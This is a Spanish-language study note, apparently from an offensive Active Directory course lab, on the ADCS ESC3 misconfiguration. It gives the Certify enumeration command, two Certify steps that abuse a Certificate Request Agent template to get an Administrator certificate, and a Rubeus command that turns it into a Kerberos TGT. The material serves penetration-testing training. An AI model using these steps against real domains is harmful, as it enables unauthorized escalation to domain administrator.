---
tags: [ad, adcs, esc3, privilege-escalation, certificates]
status: completo
---

# ESC3 — Misconfigured Certificate Request Agent Templates

> Template con EKU `Certificate Request Agent` que permite firmar solicitudes de certificado **en nombre de otros usuarios**. Proceso de 2 pasos.

## Condiciones necesarias

- EKU `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`)
- `Manager Approval Required: False`
- `Authorized Signatures Required: 0`
- Domain Users tienen `Enrollment Rights`

## Detección

```
beacon> execute-assembly Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

Template Name          : ESC3
Extended Key Usage     : Certificate Request Agent
Manager Approval       : False
Enrollment Rights      : CONTOSO\Domain Users
```

## Ataque (2 pasos)

### Paso 1 — Obtener certificado de Request Agent

```
beacon> execute-assembly Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC3 \
  --quiet

# → PFX base64 del agente (tu usuario actual)
```

### Paso 2 — Usar el agente para pedir certificado como Administrator

```
beacon> execute-assembly Certify.exe request-agent \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template User \
  --target Administrator \
  --agent-pfx <PFX_base64_paso1> \
  --quiet

# → PFX base64 de Administrator
```

### Paso 3 — Pedir TGT (igual que ESC1)

```
beacon> execute-assembly Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<PFX_base64_paso2> \
  /enctype:aes256 /nowrap
```

> El template del paso 2 (`User`) debe tener `Client Authentication` en sus EKUs.

## Ver también

- [[05-ad-attacks/adcs/esc1---client-auth-templates|ESC1 - Client Auth Templates]]
- [[05-ad-attacks/adcs/esc2---any-purpose-templates|ESC2 - Any Purpose Templates]] — con Any Purpose se puede usar como Request Agent
- [[05-ad-attacks/adcs|ADCS]]
